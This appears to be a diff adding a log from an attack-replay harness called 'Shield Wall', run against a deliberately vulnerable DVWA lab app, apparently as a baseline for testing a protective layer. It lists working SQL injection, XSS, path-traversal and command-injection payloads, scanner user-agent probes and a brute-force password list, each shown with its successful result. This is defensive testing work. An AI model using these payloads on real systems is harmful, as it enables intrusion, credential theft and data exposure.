@@ -1,0 +1,38 @@
+== Shield Wall attack replay: mode=direct target=http://dvwa ==
+  [setup] authenticated session established
+-- SQL injection
+  SQLi             tautology  1' OR '1'='1            HTTP 200 EXPLOITED      First name: Hack
+  SQLi             UNION dump of password hashes      HTTP 200 EXPLOITED      Surname: 5f4dcc3b5aa765d61d8327deb882cf99
+  SQLi             time-based blind SLEEP(3)          HTTP 200 EXPLOITED      response delayed 3.007083s (>= 3s)
+-- Cross-site scripting
+  XSS              reflected <script> cookie theft    HTTP 200 EXPLOITED      <script>alert(document.cookie)</script>
+  XSS              reflected <svg onload> handler     HTTP 200 EXPLOITED      <svg/onload=alert(1)>
+  XSS              stored <img onerror> guestbook     HTTP 200 EXPLOITED      <img src=x onerror=alert(1)>
+-- Path traversal
+  PathTraversal    ../ sequence to /etc/passwd        HTTP 200 EXPLOITED      root:x:0:0:
+  PathTraversal    URL-encoded ..%2f traversal        HTTP 200 EXPLOITED      root:x:0:0:
+  PathTraversal    absolute path /etc/passwd          HTTP 200 EXPLOITED      root:x:0:0:
+-- Command injection
+  CmdInjection     ; cat /etc/passwd                  HTTP 200 EXPLOITED      root:x:0:0:
+  CmdInjection     | id                               HTTP 200 EXPLOITED      uid=33(www-data)
+  CmdInjection     && whoami && uname -a              HTTP 200 EXPLOITED      www-data
+-- Scanner user agents
+  ScannerUA        UA: sqlmap/1.10.11#stable (https:/ HTTP 200 REACHED-APP    Welcome to Damn Vulnerable
+  ScannerUA        UA: Mozilla/5.00 (Nikto/2.6.0) (Ev HTTP 200 REACHED-APP    Welcome to Damn Vulnerable
+  ScannerUA        UA: Mozilla/5.0 (compatible; Nmap  HTTP 200 REACHED-APP    Welcome to Damn Vulnerable
+-- Login brute-force burst (POST /login.php, 12 attempts, correct password last)
+  BruteForce       attempt 1 pw=123456                HTTP 302 attempt-failed Location: login.php
+  BruteForce       attempt 2 pw=password1             HTTP 302 attempt-failed Location: login.php
+  BruteForce       attempt 3 pw=letmein               HTTP 302 attempt-failed Location: login.php
+  BruteForce       attempt 4 pw=qwerty                HTTP 302 attempt-failed Location: login.php
+  BruteForce       attempt 5 pw=admin                 HTTP 302 attempt-failed Location: login.php
+  BruteForce       attempt 6 pw=welcome               HTTP 302 attempt-failed Location: login.php
+  BruteForce       attempt 7 pw=monkey                HTTP 302 attempt-failed Location: login.php
+  BruteForce       attempt 8 pw=dragon                HTTP 302 attempt-failed Location: login.php
+  BruteForce       attempt 9 pw=iloveyou              HTTP 302 attempt-failed Location: login.php
+  BruteForce       attempt 10 pw=abc123               HTTP 302 attempt-failed Location: login.php
+  BruteForce       attempt 11 pw=111111               HTTP 302 attempt-failed Location: login.php
+  BruteForce       attempt 12 pw=password             HTTP 302 EXPLOITED      logged in as admin
+  BruteForce burst verdict: EXPLOITED (password found)
+
+RESULT: 16 / 16 attack test cases succeeded against the unprotected app (exploited / reached app)   (CSV: /work/evidence/attack_direct.csv)
